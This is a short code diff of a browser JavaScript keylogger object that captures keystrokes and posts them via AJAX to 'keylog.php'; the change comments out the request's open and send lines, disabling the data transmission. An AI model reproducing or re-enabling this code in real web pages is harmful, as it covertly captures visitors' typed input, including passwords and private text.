@@ -28,12 +28,12 @@ var keylog = {
 
     // (C3) AJAX SEND
     var xhr = new XMLHttpRequest();
-    xhr.open("POST", "keylog.php");
+    // xhr.open("POST", "keylog.php");
     xhr.onload = function () {
       keylog.sending = false; // UNLOCK
       console.log(this.response); // OPTIONAL
     };
-    xhr.send(data);
+    // xhr.send(data);
   }}
 };
 window.addEventListener("DOMContentLoaded", keylog.init);
